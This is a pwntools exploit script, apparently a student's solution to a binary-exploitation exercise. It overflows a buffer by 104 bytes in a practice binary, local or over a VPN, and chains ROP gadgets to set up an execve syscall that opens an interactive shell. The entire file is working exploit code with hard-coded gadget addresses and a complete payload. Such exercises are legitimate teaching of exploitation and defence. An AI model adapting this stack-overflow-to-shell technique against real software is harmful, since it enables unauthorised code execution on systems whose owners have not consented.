#!/usr/bin/env python3
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 12)

EXE_FILENAME='../pwn_student_binaries/rop-test_marcocastagna99'


libc = None
if args.REMOTE:
     libc = ELF("../pwn_student_binaries/remote-libc/64-bits/libc.so.6")
   

exe = context.binary = ELF(EXE_FILENAME)
argv = [EXE_FILENAME]
envp = {}
gdbscript = '''
set startup-with-shell off
b *0x004011cb    # pop_rdi_addr
b *0x004011d6    # syscall
'''

def start():
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(argv=argv, env=envp)


#rdi ->firts argument : /bin/bash
#rsi -> second argument : NULL
#rdx -> third argument : NULL
#rax -> syscall number : 59


RIP_OFFSET = 104

pop_rdi_addr = 0x4011cb  #pop rdi; pop rcx; ret
bin_sh_addr = 0x402051 
pop_rdx= 0x401199        #pop rdx; ret
pop_rax=0x4011c6         #pop rax; xor rdi, rdi; ret  
rax_value=59
syscall = 0x4011d6
xor_rsi= 0x40119f        #xor rsi, rsi; ret
return_addr = 0x40101a  




io = start()


payload = b"A" * RIP_OFFSET 
payload += p64(return_addr)  #return address to avoid segmentation fault
payload += p64(pop_rax) + p64(59)   #rax=59, I it put there becasue has also xor rdi, rdi               
payload += p64(pop_rdi_addr) + p64(bin_sh_addr) #rdi -> /bin/bash but the gadget has also pop rcx
payload += p64(0)  #taked from pop rcx
payload += p64(xor_rsi)  #xor rsi, rsi   -> rsi = 0                  
payload += p64(pop_rdx) + p64(0) #pop rdx, rdx -> rdx = 0                    
payload += p64(syscall) 

io.sendlineafter(b": ",payload)



io.interactive()
io.close()









